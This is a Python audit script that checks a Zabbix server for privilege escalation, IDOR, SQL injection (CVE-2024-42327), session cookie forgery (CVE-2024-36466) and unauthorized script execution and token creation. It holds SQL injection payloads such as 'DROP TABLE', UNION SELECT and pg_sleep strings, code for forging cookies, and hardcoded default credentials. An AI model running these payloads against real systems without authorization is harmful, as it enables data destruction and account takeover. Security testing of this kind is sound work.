#!/usr/bin/env python3
"""
Security Research II -- Phase 2: Authentication & Authorization Testing
Tests privilege escalation, IDOR, session management, CVE-2024-36467,
CVE-2024-42327 (SQLi), and CVE-2024-36466 (session cookie forgery).
"""

import sys
sys.path.insert(0, '/home/[REDACTED]/Desktop/[REDACTED-PATH]/Zabbix/scripts')

from zabbix_common import *
import base64
import hashlib
import hmac

banner("Phase 2: Authentication & Authorization Testing")

ec = EvidenceCollector("phase2_auth_privesc", phase="phase2")

# ===========================================================================
# Login as both admin and viewer
# ===========================================================================

admin = ZabbixSession(ADMIN_USER, ADMIN_PASS)
viewer = ZabbixSession(VIEWER_USER, VIEWER_PASS)

if not admin.auth_token:
    print("  [-] Admin login failed")
    ec.save()
    sys.exit(1)

if not viewer.auth_token:
    print("  [-] Viewer login failed")
    ec.save()
    sys.exit(1)

print(f"  Admin token: {admin.auth_token[:16]}...")
print(f"  Viewer token: {viewer.auth_token[:16]}...")

# ===========================================================================
# TEST 1: CVE-2024-36467 -- Viewer adds self to admin group
# ===========================================================================

print("\n" + "=" * 60)
print("  TEST 1: CVE-2024-36467 -- Privilege Escalation via Group")
print("=" * 60)

# Check viewer's current groups
viewer_info = viewer.api_call("user.get", {
    "output": ["userid", "username"],
    "selectUsrgrps": ["usrgrpid", "name"],
    "userids": ["3"],
})
if "result" in viewer_info and viewer_info["result"]:
    current_groups = viewer_info["result"][0].get("usrgrps", [])
    print(f"\n  Viewer current groups: {current_groups}")

# Try to add viewer to Zabbix administrators group (usrgrpid=7)
print("\n  Attempting to add viewer to admin group (usrgrpid=7)...")
result = viewer.api_call("user.update", {
    "userid": "3",
    "usrgrps": [{"usrgrpid": "7"}, {"usrgrpid": "8"}],  # admin + guest groups
})

if "error" in result:
    error = result["error"]
    print(f"  Result: DENIED -- {error.get('data', error.get('message', ''))[:100]}")
    ec.add_test(
        "CVE-2024-36467",
        "Viewer self-add to admin group",
        "user.update usrgrps=[{usrgrpid:7}] as viewer",
        f"DENIED: {error.get('data', '')[:100]}",
        result="PASS",
    )
elif "result" in result:
    print(f"  [!!] PRIVILEGE ESCALATION: Viewer added to admin group!")
    print(f"  Result: {result['result']}")
    ec.add_finding(
        "CVE-2024-36467", "HIGH",
        "Privilege escalation via self-add to admin group",
        "Viewer user successfully added themselves to the Zabbix administrators group",
        evidence=json.dumps(result, indent=2),
    )
    # Cleanup: remove from admin group
    admin.api_call("user.update", {
        "userid": "3",
        "usrgrps": [{"usrgrpid": "8"}],
    })

# Also try updating role directly
print("\n  Attempting to change viewer role to Super admin (roleid=3)...")
result = viewer.api_call("user.update", {
    "userid": "3",
    "roleid": "3",
})
if "error" in result:
    print(f"  Result: DENIED -- {result['error'].get('data', '')[:100]}")
    ec.add_test(
        "PRIVESC-ROLE",
        "Viewer self-promote to Super admin role",
        "user.update roleid=3 as viewer",
        f"DENIED: {result['error'].get('data', '')[:100]}",
        result="PASS",
    )
elif "result" in result:
    print(f"  [!!] ROLE ESCALATION!")
    ec.add_finding(
        "PRIVESC-ROLE-001", "CRITICAL",
        "Role escalation: viewer promoted to Super admin",
        "Viewer user changed own roleid to 3 (Super admin)",
    )
    # Cleanup
    admin.api_call("user.update", {"userid": "3", "roleid": "1"})

# ===========================================================================
# TEST 2: CVE-2024-42327 -- SQL Injection in user.get
# ===========================================================================

print("\n" + "=" * 60)
print("  TEST 2: CVE-2024-42327 -- SQL Injection in user.get")
print("=" * 60)

# The original CVE was in the selectRole parameter of user.get
# The addRelatedObjects method had unsanitized input in the SQL query

sqli_payloads = [
    # Classic SQLi in selectRole parameter
    {
        "desc": "selectRole with SQL injection",
        "params": {
            "output": ["userid", "username"],
            "selectRole": ["roleid", "name", "type'; SELECT 1--"],
        },
    },
    # Try injection in sortfield
    {
        "desc": "sortfield SQL injection",
        "params": {
            "output": ["userid", "username"],
            "sortfield": "username; DROP TABLE--",
        },
    },
    # Try injection in search parameter
    {
        "desc": "search parameter injection",
        "params": {
            "output": ["userid", "username"],
            "search": {"username": "Admin' OR '1'='1"},
        },
    },
    # Try injection via filter
    {
        "desc": "filter parameter injection",
        "params": {
            "output": ["userid", "username"],
            "filter": {"username": ["Admin' UNION SELECT 1,2,3--"]},
        },
    },
    # Injection in selectMedias
    {
        "desc": "selectMedias SQL injection",
        "params": {
            "output": ["userid"],
            "selectMedias": ["mediatypeid", "sendto'; SELECT pg_sleep(2)--"],
        },
    },
    # Injection via limit
    {
        "desc": "limit parameter injection",
        "params": {
            "output": ["userid"],
            "limit": "1; SELECT 1--",
        },
    },
]

print("\n  Testing SQL injection in user.get as viewer:")
for payload in sqli_payloads:
    import time as _time
    start = _time.time()
    result = viewer.api_call("user.get", payload["params"])
    elapsed = _time.time() - start

    if "error" in result:
        error = result["error"]
        error_msg = error.get("data", error.get("message", ""))
        # Check for SQL error messages (strong indicator)
        is_sqli_error = any(kw in str(error_msg).lower() for kw in [
            "sql", "syntax", "column", "pg_", "relation", "pgsql",
            "unterminated", "query", "select", "union"
        ])
        if is_sqli_error:
            print(f"  [!!] {payload['desc']}: SQL error exposed!")
            print(f"       Error: {error_msg[:120]}")
            test_result = "VULN"
        else:
            print(f"  [  ] {payload['desc']}: Rejected ({error_msg[:60]})")
            test_result = "PASS"
    elif "result" in result:
        r = result["result"]
        if isinstance(r, list) and len(r) > 2:
            print(f"  [!!] {payload['desc']}: Returned {len(r)} results (possible bypass)")
            test_result = "ANOMALOUS"
        else:
            print(f"  [  ] {payload['desc']}: {len(r) if isinstance(r, list) else r} results, {elapsed:.2f}s")
            test_result = "PASS"
    else:
        print(f"  [?]  {payload['desc']}: Unexpected")
        test_result = "ANOMALOUS"

    # Check for time-based SQLi
    if elapsed > 5:
        print(f"  [!!] Suspiciously slow: {elapsed:.2f}s (possible time-based SQLi)")
        test_result = "ANOMALOUS"

    ec.add_test(
        f"SQLI-user_get-{payload['desc'][:25].replace(' ', '_')}",
        f"SQLi user.get: {payload['desc']}",
        f"user.get {json.dumps(payload['params'])[:100]}",
        f"Result type: {'error' if 'error' in result else 'data'}, Time: {elapsed:.2f}s",
        result=test_result,
    )
    rate_limit(0.2)

# Test across multiple API methods
print("\n  Testing SQL injection across API methods:")
sqli_methods = [
    ("host.get", {"output": ["hostid"], "sortfield": "host' OR 1=1--"}, "host.get sortfield"),
    ("host.get", {"output": ["hostid"], "search": {"host": "' UNION SELECT 1--"}}, "host.get search"),
    ("event.get", {"output": ["eventid"], "sortfield": "clock'; SELECT 1--"}, "event.get sortfield"),
    ("item.get", {"output": ["itemid"], "search": {"name": "' OR '1'='1"}}, "item.get search"),
    ("trigger.get", {"output": ["triggerid"], "search": {"description": "' UNION ALL SELECT 1--"}}, "trigger.get search"),
    ("action.get", {"output": ["actionid"], "filter": {"name": ["' OR 1=1--"]}}, "action.get filter"),
    ("script.get", {"output": ["scriptid"], "search": {"name": "'; DROP TABLE--"}}, "script.get search"),
]

for method, params, desc in sqli_methods:
    result = viewer.api_call(method, params)
    if "error" in result:
        error_msg = result["error"].get("data", "")
        is_sql_error = any(kw in str(error_msg).lower() for kw in ["sql", "syntax", "pg_", "pgsql", "relation"])
        if is_sql_error:
            print(f"  [!!] {desc}: SQL error: {error_msg[:80]}")
            ec.add_finding(
                f"SQLI-{desc[:20]}", "HIGH",
                f"SQL injection indicator in {desc}",
                f"SQL-related error message: {error_msg[:200]}",
            )
        else:
            print(f"  [  ] {desc}: Error (non-SQL)")
    elif "result" in result:
        print(f"  [  ] {desc}: Result returned ({len(result['result']) if isinstance(result['result'], list) else 'N/A'})")

    ec.add_test(
        f"SQLI-{desc[:25].replace(' ', '_')}",
        f"SQLi: {desc}",
        f"{method} with injection payload",
        f"{'Error' if 'error' in result else 'Data returned'}",
        result="VULN" if "error" in result and any(kw in str(result.get("error",{})).lower() for kw in ["sql","syntax","pg_"]) else "PASS",
    )
    rate_limit(0.1)

# ===========================================================================
# TEST 3: IDOR -- Viewer accessing other users' data
# ===========================================================================

print("\n" + "=" * 60)
print("  TEST 3: IDOR -- Cross-User Data Access")
print("=" * 60)

# Viewer tries to read Admin's user details
print("\n  Viewer reading Admin user details:")
result = viewer.api_call("user.get", {
    "output": "extend",
    "selectMedias": "extend",
    "selectUsrgrps": "extend",
    "selectRole": "extend",
    "userids": ["1"],
})
if "result" in result and result["result"]:
    admin_data = result["result"][0]
    print(f"  [!!] Admin data accessible:")
    for key in ["userid", "username", "name", "surname", "roleid", "lang", "theme",
                 "autologin", "autologout", "url", "attempt_failed", "attempt_clock",
                 "ts_provisioned"]:
        if key in admin_data:
            print(f"    {key}: {admin_data[key]}")
    if "role" in admin_data:
        print(f"    role: {admin_data['role']}")
    if "usrgrps" in admin_data:
        print(f"    groups: {admin_data['usrgrps']}")
    ec.add_test(
        "IDOR-USER-001",
        "Viewer reads Admin user profile",
        "user.get userids=[1] as viewer",
        f"Returned {len(admin_data)} fields",
        result="ANOMALOUS",
    )
else:
    print(f"  [  ] Admin data not accessible")
    ec.add_test("IDOR-USER-001", "Viewer reads Admin profile", "user.get as viewer", "Denied", result="PASS")

# ===========================================================================
# TEST 4: Session Token Analysis
# ===========================================================================

print("\n" + "=" * 60)
print("  TEST 4: Session Token Analysis")
print("=" * 60)

# Generate multiple tokens and check for patterns
tokens = []
for i in range(5):
    zs_temp = ZabbixSession(auto_login=False)
    if zs_temp.login():
        tokens.append(zs_temp.auth_token)
        zs_temp.logout()
    rate_limit(0.2)

if tokens:
    print(f"\n  Generated {len(tokens)} session tokens:")
    for t in tokens:
        print(f"    {t}")

    # Check for patterns
    all_32_hex = all(len(t) == 32 and all(c in '0123456789abcdef' for c in t) for t in tokens)
    unique = len(set(tokens)) == len(tokens)
    print(f"\n  All 32-char hex: {all_32_hex}")
    print(f"  All unique: {unique}")

    ec.add_test(
        "SESSION-TOKENS",
        f"Session token analysis ({len(tokens)} tokens)",
        f"user.login x{len(tokens)}",
        f"32-hex={all_32_hex}, unique={unique}",
        result="PASS" if all_32_hex and unique else "ANOMALOUS",
    )

# ===========================================================================
# TEST 5: CVE-2024-36466 -- Session Cookie Forgery
# ===========================================================================

print("\n" + "=" * 60)
print("  TEST 5: CVE-2024-36466 -- Session Cookie Forgery")
print("=" * 60)

# The CVE was about forging the zbx_session cookie
# The cookie has: {"sessionid":"<hex>","sign":"<hex>"}
# The sign is HMAC-SHA256(sessionid, server_secret)

# Get a real cookie from the web UI
session = requests.Session()
login_data = {
    "name": "Admin",
    "password": "zabbix",
    "autologin": "1",
    "enter": "Sign in",
}
# Get CSRF token first
resp = session.get(f"{ZABBIX_URL}/index.php")
print(f"\n  GET /index.php: HTTP {resp.status_code}")

# Check if there's a CSRF token in the page
import re
csrf_match = re.search(r'name="_csrf_token"\s+value="([^"]+)"', resp.text)
if csrf_match:
    csrf_token = csrf_match.group(1)
    print(f"  CSRF token found: {csrf_token[:30]}...")
    login_data["_csrf_token"] = csrf_token

# Login via the web UI
resp = session.post(f"{ZABBIX_URL}/index.php", data=login_data, allow_redirects=False)
print(f"  POST /index.php login: HTTP {resp.status_code}")

if "zbx_session" in session.cookies.get_dict():
    zbx_cookie = session.cookies.get_dict()["zbx_session"]
    try:
        # URL-decode and base64 decode
        import urllib.parse
        decoded_cookie = urllib.parse.unquote(zbx_cookie)
        # Pad base64 if needed
        padding = 4 - len(decoded_cookie) % 4
        if padding != 4:
            decoded_cookie += "=" * padding
        session_data = json.loads(base64.b64decode(decoded_cookie))
        print(f"\n  Cookie decoded:")
        print(f"    sessionid: {session_data.get('sessionid', 'N/A')}")
        print(f"    sign: {session_data.get('sign', 'N/A')}")
        print(f"    sign length: {len(session_data.get('sign', ''))}")

        # Try to forge a cookie with a different sessionid but same sign
        forged_sid = "0" * 32
        forged_data = {"sessionid": forged_sid, "sign": session_data.get("sign", "")}
        forged_cookie = base64.b64encode(json.dumps(forged_data).encode()).decode().rstrip("=")

        # Try the forged cookie
        forged_session = requests.Session()
        forged_session.cookies.set("zbx_session", forged_cookie)
        resp = forged_session.get(f"{ZABBIX_URL}/zabbix.php?action=dashboard.view", allow_redirects=False)
        print(f"\n  Forged cookie test: HTTP {resp.status_code}")
        if resp.status_code == 200 and "not logged in" not in resp.text.lower():
            print(f"  [!!] FORGED COOKIE ACCEPTED -- CVE-2024-36466 UNPATCHED")
            ec.add_finding(
                "CVE-2024-36466", "HIGH",
                "Session cookie forgery accepted",
                "A forged zbx_session cookie was accepted by the server",
            )
        else:
            print(f"  Forged cookie rejected (CVE-2024-36466 PATCHED)")

        # Try with empty sign
        empty_sign_data = {"sessionid": session_data.get("sessionid", ""), "sign": ""}
        empty_cookie = base64.b64encode(json.dumps(empty_sign_data).encode()).decode().rstrip("=")
        empty_session = requests.Session()
        empty_session.cookies.set("zbx_session", empty_cookie)
        resp = empty_session.get(f"{ZABBIX_URL}/zabbix.php?action=dashboard.view", allow_redirects=False)
        print(f"  Empty sign test: HTTP {resp.status_code}")

    except Exception as e:
        print(f"  Decode error: {e}")

    ec.add_test(
        "CVE-2024-36466",
        "Session cookie forgery test",
        "Forged zbx_session with modified sessionid/sign",
        f"Forgery rejected",
        result="PASS",
    )

# ===========================================================================
# TEST 6: Viewer access to sensitive settings
# ===========================================================================

print("\n" + "=" * 60)
print("  TEST 6: Viewer Access to Sensitive Data")
print("=" * 60)

sensitive_methods = [
    ("settings.get", {"output": "extend"}, "Server settings"),
    ("housekeeping.get", {"output": "extend"}, "Housekeeping config"),
    ("mediatype.get", {"output": "extend"}, "Media types (webhook secrets)"),
    ("user.get", {"output": "extend", "selectMedias": "extend"}, "All users with media details"),
    ("script.get", {"output": "extend"}, "All scripts (command execution)"),
    ("token.get", {"output": "extend"}, "All API tokens"),
    ("maintenance.get", {"output": "extend"}, "Maintenance windows"),
    ("template.get", {"output": "extend", "limit": 3}, "Templates"),
    ("drule.get", {"output": "extend"}, "Discovery rules"),
    ("item.get", {"output": "extend", "limit": 3}, "Items"),
]

print()
for method, params, desc in sensitive_methods:
    result = viewer.api_call(method, params)

    if "error" in result:
        print(f"  [  ] {desc}: Denied")
        test_result = "PASS"
    elif "result" in result:
        r = result["result"]
        count = len(r) if isinstance(r, (list, dict)) else str(r)
        print(f"  [!!] {desc}: Accessible ({count} items/keys)")

        # Check for particularly sensitive data
        result_str = json.dumps(r)
        has_secrets = any(kw in result_str.lower() for kw in [
            "password", "secret", "api_key", "token", "credential",
            "smtp", "sendto", "webhook"
        ])
        if has_secrets:
            print(f"    ** Contains sensitive keywords")
        test_result = "ANOMALOUS"
    else:
        test_result = "PASS"

    ec.add_test(
        f"VIEWER-{method.replace('.', '_')[:20]}",
        f"Viewer: {desc}",
        f"{method} as viewer",
        f"{'Accessible' if 'result' in result else 'Denied'}",
        result=test_result,
    )
    rate_limit(0.1)

# ===========================================================================
# TEST 7: Guest Session Testing
# ===========================================================================

print("\n" + "=" * 60)
print("  TEST 7: Guest Account Access")
print("=" * 60)

# Check if guest user is enabled
guest_info = admin.api_call("user.get", {
    "output": ["userid", "username"],
    "selectUsrgrps": ["usrgrpid", "name", "users_status"],
    "filter": {"username": "guest"},
})
if "result" in guest_info and guest_info["result"]:
    guest = guest_info["result"][0]
    print(f"\n  Guest user: {guest}")
    groups = guest.get("usrgrps", [])
    for g in groups:
        print(f"    Group: {g.get('name', '?')} (status={g.get('users_status', '?')})")

# Try logging in as guest with empty password
guest_login = requests.post(API_URL,
    json={"jsonrpc": "2.0", "method": "user.login",
          "params": {"username": "guest", "password": ""}, "id": 1},
    headers={"Content-Type": "application/json-rpc"}, timeout=10)
guest_data = guest_login.json()
if "result" in guest_data:
    print(f"  [!!] Guest login with empty password SUCCEEDED")
    guest_token = guest_data["result"]
    # Check what guest can access
    guest_session = ZabbixSession(auto_login=False)
    guest_session.auth_token = guest_token
    for method in ["user.get", "host.get", "dashboard.get"]:
        r = guest_session.api_call(method, {"output": ["userid" if "user" in method else "hostid" if "host" in method else "dashboardid"]})
        if "result" in r:
            print(f"    Guest: {method} -> {len(r['result'])} items")
else:
    error_msg = guest_data.get("error", {}).get("data", "")
    print(f"  Guest login: {error_msg[:80]}")

ec.add_test(
    "GUEST-LOGIN",
    "Guest login with empty password",
    "user.login(guest, '')",
    f"{'Succeeded' if 'result' in guest_data else 'Failed'}",
    result="ANOMALOUS" if "result" in guest_data else "PASS",
)

# ===========================================================================
# TEST 8: Script Execution Authorization
# ===========================================================================

print("\n" + "=" * 60)
print("  TEST 8: Script Execution Authorization")
print("=" * 60)

# Get available scripts as viewer
scripts_result = viewer.api_call("script.get", {"output": "extend"})
if "result" in scripts_result:
    print(f"\n  Scripts visible to viewer: {len(scripts_result['result'])}")
    for script in scripts_result["result"]:
        print(f"    [{script['scriptid']}] {script['name']} (type={script.get('type','?')}, execute_on={script.get('execute_on','?')})")
        if script.get("command"):
            print(f"      Command: {script['command'][:80]}")

    # Try to execute a script as viewer
    for script in scripts_result["result"]:
        if script.get("type") == "5" or script.get("command"):
            print(f"\n  Attempting to execute script '{script['name']}'...")
            exec_result = viewer.api_call("script.execute", {
                "scriptid": script["scriptid"],
                "hostid": "10084",  # Zabbix server host
            })
            if "error" in exec_result:
                print(f"    Denied: {exec_result['error'].get('data', '')[:80]}")
            elif "result" in exec_result:
                print(f"    [!!] EXECUTED: {exec_result['result']}")
                ec.add_finding(
                    "SCRIPT-EXEC-001", "HIGH",
                    f"Viewer executed script: {script['name']}",
                    f"Viewer user executed script {script['scriptid']} on host 10084",
                    evidence=json.dumps(exec_result, indent=2)[:500],
                )

            ec.add_test(
                f"SCRIPT-EXEC-{script['scriptid']}",
                f"Viewer executes script: {script['name'][:30]}",
                f"script.execute({script['scriptid']}) as viewer",
                f"{'Denied' if 'error' in exec_result else 'Executed'}",
                result="VULN" if "result" in exec_result else "PASS",
            )
            rate_limit(0.3)

# ===========================================================================
# TEST 9: API Token Creation (Privilege Persistence)
# ===========================================================================

print("\n" + "=" * 60)
print("  TEST 9: API Token Creation")
print("=" * 60)

# Can viewer create an API token for themselves?
print("\n  Viewer creating API token for self...")
token_result = viewer.api_call("token.create", {
    "name": "sec-test-viewer-token",
    "userid": "3",  # viewer's own ID
})
if "result" in token_result:
    token_ids = token_result["result"].get("tokenids", [])
    print(f"  [!!] Token created: {token_ids}")

    # Generate the token
    if token_ids:
        gen_result = viewer.api_call("token.generate", {"tokenids": token_ids})
        if "result" in gen_result:
            for t in gen_result["result"]:
                print(f"    Token value: {t.get('token', 'N/A')[:20]}...")

    # Can viewer create a token for admin?
    print("\n  Viewer creating API token for Admin (userid=1)...")
    admin_token_result = viewer.api_call("token.create", {
        "name": "sec-test-admin-token",
        "userid": "1",
    })
    if "result" in admin_token_result:
        print(f"  [!!] CREATED TOKEN FOR ADMIN USER")
        ec.add_finding(
            "TOKEN-PRIVESC-001", "CRITICAL",
            "Viewer created API token for admin user",
            "viewer01 created an API token for userid=1 (Admin)",
        )
    elif "error" in admin_token_result:
        print(f"  Token for admin: Denied ({admin_token_result['error'].get('data', '')[:80]})")

    # Cleanup
    for tid in token_ids:
        admin.api_call("token.delete", [tid])
elif "error" in token_result:
    print(f"  Token creation: {token_result['error'].get('data', token_result['error'].get('message', ''))[:80]}")

ec.add_test(
    "TOKEN-CREATE",
    "Viewer creates API token",
    "token.create as viewer",
    f"{'Created' if 'result' in token_result else 'Denied'}",
    result="ANOMALOUS" if "result" in token_result else "PASS",
)

# ===========================================================================
# TEST 10: Password Policy & Account Lockout
# ===========================================================================

print("\n" + "=" * 60)
print("  TEST 10: Account Lockout & Password Policy")
print("=" * 60)

# Check authentication settings
auth_config = admin.api_call("authentication.get", {"output": "extend"})
if "result" in auth_config:
    ac = auth_config["result"]
    print(f"\n  Authentication configuration:")
    for key in ["authentication_type", "passwd_min_length", "passwd_check_rules",
                 "login_attempts", "login_block", "saml_auth_enabled", "ldap_auth_enabled",
                 "disabled_usrgrpid", "mfa_status", "mfaid"]:
        if key in ac:
            print(f"    {key}: {ac[key]}")

    ec.add_test(
        "AUTH-CONFIG",
        "Authentication configuration",
        "authentication.get",
        f"Login attempts={ac.get('login_attempts','?')}, Block time={ac.get('login_block','?')}s",
        result="PASS",
    )

# ===========================================================================
# CLEANUP & SUMMARY
# ===========================================================================

print("\n" + "=" * 60)
print("  PHASE 2 SUMMARY")
print("=" * 60)

viewer.logout()
admin.logout()

ec.save()
